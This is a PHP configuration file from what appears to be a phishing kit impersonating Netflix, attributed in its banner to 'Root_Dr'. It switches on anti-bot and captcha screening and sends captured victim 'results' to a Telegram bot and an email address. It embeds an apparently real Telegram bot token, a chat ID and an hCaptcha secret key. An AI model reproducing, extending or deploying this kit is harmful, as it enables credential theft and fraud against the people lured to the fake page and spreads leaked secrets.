<?php
/*
██████╗ ██╗      █████╗  ██████╗██╗  ██╗███████╗ ██████╗ ██████╗  ██████╗███████╗
██╔══██╗██║     ██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔════╝
██████╔╝██║     ███████║██║     █████╔╝ █████╗  ██║   ██║██████╔╝██║     █████╗  
██╔══██╗██║     ██╔══██║██║     ██╔═██╗ ██╔══╝  ██║   ██║██╔══██╗██║     ██╔══╝  
██████╔╝███████╗██║  ██║╚██████╗██║  ██╗██║     ╚██████╔╝██║  ██║╚██████╗███████╗
╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚══════╝   
Coded By Root_Dr
DM:@Root_Dr
*/
session_start();
error_reporting(0);

// Hcaptcha https://www.hcaptcha.com/
define("HCAPTCHA", false); // true or false
define("SECRETKEY", 'ES_2dd040c308584ef5b784d8fd00e8dea0'); // secretkey hcaptcha
define("SITEKEY", '6974217a-6e20-4e98-90ce-44b604682a1a'); // site key hcaptcha

define("TESTMODE", false); // true or false
define("ANTIBOTPW_API", ''); // ANTIBOT.PW API

define("FLAG", '🎞️');
define("SCAM_NAME", 'NETFLIX');
define("WEBSITE", 'https://netflix.com/');

// SCAM LINK
define("PANEL", '');
// TELEGRAM BOT REZ CONFIG
define("TOKEN", '1701198811:AAG-U46NOeoIJxJu-T5E4MtAJH2MlqeJ8Xk');
define("CHATID", '-514572793');

define("NOTIF", true); // true or false
define("NOTIF_CHATID", '-514572793');

// MAIL REZ CONFIG
define("BULLET", 'your@email.com');

define("PHONE", true); // true or false
define("CONTROLLER", true); // true or false
